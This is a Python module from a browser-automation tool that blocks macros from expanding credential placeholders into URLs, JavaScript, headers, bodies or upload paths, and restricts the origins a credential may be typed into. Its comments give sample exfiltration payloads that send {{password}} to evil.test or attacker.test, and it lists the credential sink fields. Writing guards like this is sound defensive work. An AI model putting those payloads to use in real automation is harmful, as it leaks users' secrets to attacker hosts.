# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""The portable half of the macro credential-sink guard.

Live replay (``macros.substitution``) and the exported macro CLI both expand
``{{name}}`` placeholders through :func:`expand_actions`, and the exporter
renders this module's source verbatim into every generated script
(:func:`octowright.artifacts.script_export.render_macro_cli`), the way it
renders ``drawn_text``. So it imports only the standard library and every name
it defines is fair game in the script's namespace. The exported CLI used to
substitute with a plain ``re.sub`` and no guard at all, so a macro that
``macro_run`` refused ran to completion as a script.

The classifier that decides which arg is a credential is NOT here: it lives in
``macros.privacy`` and the script carries its own rendering of it. Callers pass
it in as *is_credential*.

Replay's alias table lives here too, because the guard has to judge the field
replay will actually use: ``inject_headers`` and ``mock_route`` accept both the
recorder's ``pattern`` and the session's ``url_pattern``, and a guard that read
one while replay installed the other was a bypass.
"""

from __future__ import annotations

import copy
import os
import re
from collections.abc import Callable
from typing import Any
from urllib.parse import urlsplit

# Action fields that either leave the machine or execute code. A credential
# expanded into one of these is exfiltration, not automation:
# ``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
# the secret to whoever wrote the macro, and ``evaluate`` hands it to page JS.
#
# The set is by FIELD NAME, so it has to grow whenever a new action introduces
# a differently-spelled code sink. ``a11y_dragdrop`` did exactly that: its
# ``verify_js`` and ``grabbed_predicate_js`` are handed straight to
# ``locator.evaluate``/``target.evaluate``, so
# ``{"action": "a11y_dragdrop", "verify_js": "() => fetch('https://evil.test/?p={{password}}')"}``
# was an unguarded ``evaluate`` under a different name.
#
# The same gap existed for fields that leave the machine without being a URL.
# ``headers`` (inject_headers, set_extra_http_headers, mock_route) rides every
# matching request, and inject_headers takes an attacker-chosen ``pattern``, so
# ``{"headers": {"X-Leak": "{{password}}"}}`` with ``pattern:
# "https://attacker.test/**"`` delivered the password to that host. mock_route's
# ``body`` is served to the page -- for a script request it is code the page
# runs. An upload's ``paths`` entry becomes the filename the server receives.
# Audited against every action in ``runtime._ACTION_MAP``: the remaining string
# fields (selectors, locator text, ``pattern`` match strings, ``expect_*``
# needles, ``value``/``text`` typed into the page, the screenshot ``path``
# contained under RECORDINGS_DIR) are matched locally or ARE the intended
# destination of a credential.
CREDENTIAL_UNSAFE_KEYS = frozenset(
    {"url", "expression", "verify_js", "grabbed_predicate_js", "headers", "body", "paths"}
)

CREDENTIAL_SINKS_ENV = "OCTOWRIGHT_MACRO_CREDENTIAL_SINKS"
_CREDENTIAL_SINKS_OFF = frozenset({"0", "off", "false", "no", "never", "none", "disabled", "allow"})


def credential_sinks_blocked() -> bool:
    """Whether to refuse a credential-named arg in a navigation/code sink.

    ON by default. Set ``OCTOWRIGHT_MACRO_CREDENTIAL_SINKS`` to a falsey token
    (or ``allow``) for a suite that intentionally puts a token in a URL --
    an API-key query parameter is the legitimate case this would otherwise
    break.
    """
    raw = os.environ.get(CREDENTIAL_SINKS_ENV, "block").strip().lower()
    return raw not in _CREDENTIAL_SINKS_OFF


# Recorded keys that need renaming to match the method's parameter names.
# mock_route/unmock_route: session/core_interaction_mixin.py's recorder.record()
# writes the field as "pattern" (matching macros/lint.py's required-field name),
# but the session methods' parameter is "url_pattern" — without this rename,
# every recorded mock_route/unmock_route replay raised TypeError: unexpected
# keyword argument 'pattern', dead on arrival since the two sides disagreed
# on the field name.
REPLAY_RENAME_KEYS: dict[str, dict[str, str]] = {
    "drag": {"source": "source_selector", "target": "target_selector"},
    "mock_route": {"pattern": "url_pattern"},
    "unmock_route": {"pattern": "url_pattern"},
    # Same split, same reason: the recorder writes "pattern", the session
    # method's parameter is "url_pattern".
    "inject_headers": {"pattern": "url_pattern"},
    "uninject_headers": {"pattern": "url_pattern"},
}


def canonical_aliases(kind: str, fields: dict[str, Any]) -> dict[str, Any]:
    """*fields* with every recorded spelling renamed to the one replay passes on.

    Two spellings of one field that disagree are refused rather than resolved:
    whichever rule picked a winner, a guard and a dispatcher that each applied
    it separately could disagree, and a formatter or a diff merge that reorders
    keys must not change which pattern is installed.
    """
    renames = REPLAY_RENAME_KEYS.get(kind)
    if not renames:
        return dict(fields)
    for recorded, param in renames.items():
        if recorded in fields and param in fields and fields[recorded] != fields[param]:
            raise ValueError(
                f"{kind} carries both {recorded!r} and {param!r} with different values; "
                f"they are one field, so keep only {param!r}"
            )
    return {renames.get(key, key): value for key, value in fields.items()}


#: Actions whose ``headers`` go only where their ``url_pattern`` matches.
#: ``set_extra_http_headers`` is absent on purpose: it rides every request the
#: page makes, third-party hosts included, so it has no destination to vet.
PATTERN_SCOPED_HEADER_ACTIONS = frozenset({"inject_headers", "mock_route"})

#: An origin as the guard compares it: scheme, normalized host, effective port.
Origin = tuple[str, str, int]

_DEFAULT_PORTS = {"http": 80, "https": 443}


def url_origin(url: object) -> Origin | None:
    """The origin of *url*, or None for anything that is not an http(s) URL with a host.

    The host is lowercased and loses a trailing dot; a missing port becomes the
    scheme's default, so ``https://app.test`` and ``https://app.test:443`` are
    one origin while ``http://localhost:3000`` and ``http://localhost:45678``
    are two. Comparing hostnames alone let a macro exempt a header for
    whichever local process listened on another port.
    """
    if not isinstance(url, str) or not url:
        return None
    try:
        parts = urlsplit(url.strip())
        port = parts.port
    except ValueError:
        return None
    scheme = parts.scheme.lower()
    host = (parts.hostname or "").lower().rstrip(".")
    if scheme not in _DEFAULT_PORTS or not host:
        return None
    return scheme, host, port if port is not None else _DEFAULT_PORTS[scheme]


def format_origin(origin: Origin) -> str:
    scheme, host, port = origin
    shown = f"[{host}]" if ":" in host else host
    return f"{scheme}://{shown}" if port == _DEFAULT_PORTS.get(scheme) else f"{scheme}://{shown}:{port}"


#: A pattern names one origin only when its scheme and host are spelled out: no
#: wildcard, no placeholder, no userinfo, no backslash. ``https://*.example.test/**``
#: and ``https://{{host}}/**`` choose the host at match or run time,
#: ``https://app.test@attacker.test/`` is attacker.test to a URL parser, and
#: ``**/api/**`` names no origin at all. A port is optional and, when absent, is
#: the scheme's default -- which is also what the pattern matches in a browser.
_LITERAL_PATTERN_ORIGIN = re.compile(r"^(https?://[^/?#*{}\[\]@\\\s]+)(?:/|$)", re.IGNORECASE)


def pattern_origin(pattern: object) -> Origin | None:
    match = _LITERAL_PATTERN_ORIGIN.match(pattern) if isinstance(pattern, str) else None
    return url_origin(match.group(1)) if match is not None else None


def headers_reach_trusted_origin(action: dict[str, Any], trusted_origins: frozenset[Origin] | set[Origin]) -> bool:
    """Whether *action*'s headers go only to one of *trusted_origins*.

    *action* must already be alias-canonical, so the pattern read here is the
    one replay installs.
    """
    if not trusted_origins or action.get("action") not in PATTERN_SCOPED_HEADER_ACTIONS:
        return False
    origin = pattern_origin(action.get("url_pattern"))
    return origin is not None and origin in trusted_origins


#: The field each typing action puts into the page. The sink guard lets a
#: credential through here -- it is the intended destination -- so what is
#: checked instead is WHICH page it lands in (`offsite_credential_origin`).
CREDENTIAL_FILL_FIELDS = {"fill": "value", "fill_by": "value", "type": "text"}
#: A step's own list of extra origins it may type a credential into, for a
#: sign-in hop to an identity provider. An input to the guard, never to the call.
ALLOWED_ORIGINS_KEY = "allowed_origins"
#: Set by `expand_actions` on a typing step whose value came from a
#: credential-tier arg: the names, never the values. Whatever the macro itself
#: put under this key is discarded first, so a macro cannot unmark a step.
CREDENTIAL_FILL_MARKER = "_octowright_credential_args"
CREDENTIAL_FILL_ORIGINS_ENV = "OCTOWRIGHT_MACRO_CREDENTIAL_FILL_ORIGINS"
#: Set by `expand_actions` on a ``macro_call`` whose ``args`` a credential-tier
#: arg was substituted into: the CALLEE's arg names it reached. The callee is
#: expanded with those names credential-tier whatever they are called there
#: (`expand_actions`' *credential_args*), because classifying by the callee's
#: own parameter names let a caller launder ``{{password}}`` as ``{{url}}``.
#: Discarded from the macro first, like `CREDENTIAL_FILL_MARKER`.
CREDENTIAL_CALL_MARKER = "_octowright_credential_call_args"

_EXACT_ORIGIN = re.compile(r"^https?://[^/?#*{}\[\]@\\\s]+/?$", re.IGNORECASE)


def credential_fill_mode() -> str:
    """``block`` (the default) or ``warn``. Anything else is ``block``: this fails closed."""
    raw = os.environ.get(CREDENTIAL_FILL_ORIGINS_ENV, "block").strip().lower()
    return "warn" if raw == "warn" else "block"


def parse_allowed_origins(value: object) -> frozenset[Origin]:
    """A step's ``allowed_origins``, each an exact origin written literally.

    No wildcard, path or ``{{placeholder}}``: a placeholder would let the
    caller's arguments, rather than the macro's author, choose where a
    credential may be typed, and a pattern is a promise about more hosts than
    anyone reviewed.
    """
    if value is None:
        return frozenset()
    if not isinstance(value, list):
        raise ValueError(
            f"{ALLOWED_ORIGINS_KEY} must be a list of origins such as ['https://login.example'], "
            f"got {type(value).__name__}"
        )
    origins: set[Origin] = set()
    for entry in value:
        origin = url_origin(entry) if isinstance(entry, str) and _EXACT_ORIGIN.match(entry) else None
        if origin is None:
            raise ValueError(
                f"{ALLOWED_ORIGINS_KEY} entry {str(entry)[:120]!r} is not an exact origin; write it "
                "literally as scheme://host[:port], with no wildcard, path or {{placeholder}}"
            )
        origins.add(origin)
    return frozenset(origins)


def offsite_credential_origin(
    action: dict[str, Any], current_url: object, trusted_origins: frozenset[Origin] | set[Origin]
) -> str | None:
    """The origin a credential-typing *action* would land on, when that is not allowed.

    None means the step may run: it types no credential, the credential checks
    are off, or the page's origin is trusted or listed on the step. Only the
    origin is ever returned, never the page's path or query.
    """
    if not action.get(CREDENTIAL_FILL_MARKER) or not credential_sinks_blocked():
        return None
    origin = url_origin(current_url)
    if origin is not None and origin in set(trusted_origins) | parse_allowed_origins(action.get(ALLOWED_ORIGINS_KEY)):
        return None
    if origin is not None:
        return format_origin(origin)
    try:
        scheme = urlsplit(str(current_url or "")).scheme
    except ValueError:
        scheme = ""
    return f"{scheme}:" if scheme else "<no page>"


def credential_fill_refusal(action: dict[str, Any], shown: str) -> ValueError:
    names = ", ".join("{{" + str(name) + "}}" for name in action.get(CREDENTIAL_FILL_MARKER) or ())
    return ValueError(
        f"macro {action.get('action')} would type credential arg {names} into a page at {shown}, "
        "which is not the session's own origin (its launch URL or persona base_url). For an "
        f'intended sign-in hop, list the origin literally on this step: "{ALLOWED_ORIGINS_KEY}": ["{shown}"]. '
        f"{CREDENTIAL_FILL_ORIGINS_ENV}=warn logs and runs the step instead; "
        f"{CREDENTIAL_SINKS_ENV}=allow turns every credential check off."
    )


def credential_input_stopped(action: dict[str, Any], reason: str) -> RuntimeError:
    """A credential step that stopped partway, naming the step and why -- never the value, nor how much was typed."""
    names = ", ".join("{{" + str(name) + "}}" for name in action.get(CREDENTIAL_FILL_MARKER) or ())
    return RuntimeError(
        f"macro {action.get('action')} stopped typing credential arg {names}: {reason}. "
        "The rest of the value was not typed; re-run the step once the page has settled."
    )


def dispatch_fields(action: dict[str, Any]) -> dict[str, Any]:
    """*action* without the guard's own inputs, which no session method takes."""
    guard_only = {CREDENTIAL_FILL_MARKER, CREDENTIAL_CALL_MARKER}
    if action.get("action") in CREDENTIAL_FILL_FIELDS:
        guard_only.add(ALLOWED_ORIGINS_KEY)
    return {key: value for key, value in action.items() if key not in guard_only}


def _sink_refusal(key: str) -> ValueError:
    return ValueError(
        f"macro expands credential arg {{{{{key}}}}} into a navigation or code sink; "
        "this would send the secret off-machine. A header may carry one through "
        "inject_headers whose pattern spells out the session's own origin -- scheme, host "
        f"and port of its launch URL or persona base_url. Set {CREDENTIAL_SINKS_ENV}=allow if that is intended."
    )


class _Expander:
    def __init__(
        self,
        args: dict[str, Any],
        *,
        is_credential: Callable[[str], bool],
        placeholder: re.Pattern[str],
        trusted_origins: frozenset[Origin] | set[Origin],
        credential_args: frozenset[str] = frozenset(),
    ) -> None:
        self.args = args
        # A name the caller's credential reached is credential-tier here too,
        # whatever it is called (`CREDENTIAL_CALL_MARKER`).
        self.is_credential = (
            (lambda key: key in credential_args or is_credential(key)) if credential_args else is_credential
        )
        self.placeholder = placeholder
        self.trusted_origins = trusted_origins
        self.blocked = credential_sinks_blocked()

    def text(self, value: str, *, unsafe_sink: bool) -> str:
        def replacer(match: re.Match[str]) -> str:
            key = match.group(1)
            if key not in self.args:
                raise KeyError(f"placeholder {{{{{key}}}}} has no matching arg; available: {list(self.args)}")
            if unsafe_sink and self.blocked and self.is_credential(key):
                raise _sink_refusal(key)
            return str(self.args[key])

        return self.placeholder.sub(replacer, value)

    def action(self, node: dict[str, Any]) -> dict[str, Any]:
        kind = str(node.get("action"))
        node = canonical_aliases(kind, node)
        node.pop(CREDENTIAL_FILL_MARKER, None)
        node.pop(CREDENTIAL_CALL_MARKER, None)
        credentials = self._typed_credentials(kind, node)
        tainted = self._tainted_call_args(node) if kind == "macro_call" else []
        headers_exempt = headers_reach_trusted_origin(node, self.trusted_origins)
        expanded = {
            key: self.value(
                item,
                unsafe_sink=key in CREDENTIAL_UNSAFE_KEYS and not (headers_exempt and key == "headers"),
            )
            for key, item in node.items()
        }
        if credentials:
            expanded[CREDENTIAL_FILL_MARKER] = credentials
        if tainted:
            expanded[CREDENTIAL_CALL_MARKER] = tainted
        return expanded

    def _mentions_credential(self, value: Any) -> bool:
        if isinstance(value, str):
            return any(self.is_credential(name) for name in self.placeholder.findall(value))
        if isinstance(value, dict):
            return any(self._mentions_credential(item) for item in value.values())
        if isinstance(value, list):
            return any(self._mentions_credential(item) for item in value)
        return False

    def _tainted_call_args(self, node: dict[str, Any]) -> list[str]:
        """The callee arg names a credential-tier arg is substituted into, anywhere in the value."""
        call_args = node.get("args")
        if not isinstance(call_args, dict):
            return []
        return sorted(str(key) for key, value in call_args.items() if self._mentions_credential(value))

    def _typed_credentials(self, kind: str, node: dict[str, Any]) -> list[str]:
        """The credential-tier args a typing step puts into the page, by name."""
        typed_field = CREDENTIAL_FILL_FIELDS.get(kind)
        if typed_field is None:
            return []
        # Judged on the macro as written, before expansion, so the list is the
        # author's and not something an argument spelled into it.
        parse_allowed_origins(node.get(ALLOWED_ORIGINS_KEY))
        typed = node.get(typed_field)
        names = self.placeholder.findall(typed) if isinstance(typed, str) else []
        return sorted({name for name in names if self.is_credential(name)})

    def value(self, value: Any, *, unsafe_sink: bool = False) -> Any:
        if isinstance(value, str):
            return self.text(value, unsafe_sink=unsafe_sink)
        if isinstance(value, dict):
            # A nested action (a try/if_selector body) is judged as an action;
            # a dict inside a sink inherits the sink so a value cannot be
            # laundered through a container.
            if not unsafe_sink and isinstance(value.get("action"), str):
                return self.action(value)
            return {
                key: self.value(item, unsafe_sink=unsafe_sink or key in CREDENTIAL_UNSAFE_KEYS)
                for key, item in value.items()
            }
        if isinstance(value, list):
            return [self.value(item, unsafe_sink=unsafe_sink) for item in value]
        return value


def expand_actions(
    actions: list[dict[str, Any]],
    args: dict[str, Any],
    *,
    is_credential: Callable[[str], bool],
    placeholder: re.Pattern[str] | str,
    trusted_origins: frozenset[Origin] | set[Origin] = frozenset(),
    credential_args: frozenset[str] = frozenset(),
) -> list[dict[str, Any]]:
    """Expand ``{{name}}`` placeholders, refusing a credential in a sink.

    Every action comes back alias-canonical (see `canonical_aliases`), so the
    guard and the dispatcher read the same field. *trusted_origins* is the one
    exemption: a credential in the ``headers`` of an action whose pattern names
    one of them, scheme, host and port. *credential_args* are names that are
    credential-tier whatever *is_credential* says: a called macro's args that
    its caller's credential reached (`CREDENTIAL_CALL_MARKER`).
    """
    compiled = re.compile(placeholder) if isinstance(placeholder, str) else placeholder
    expander = _Expander(
        args,
        is_credential=is_credential,
        placeholder=compiled,
        trusted_origins=trusted_origins,
        credential_args=credential_args,
    )
    return [expander.value(copy.deepcopy(action)) for action in actions]
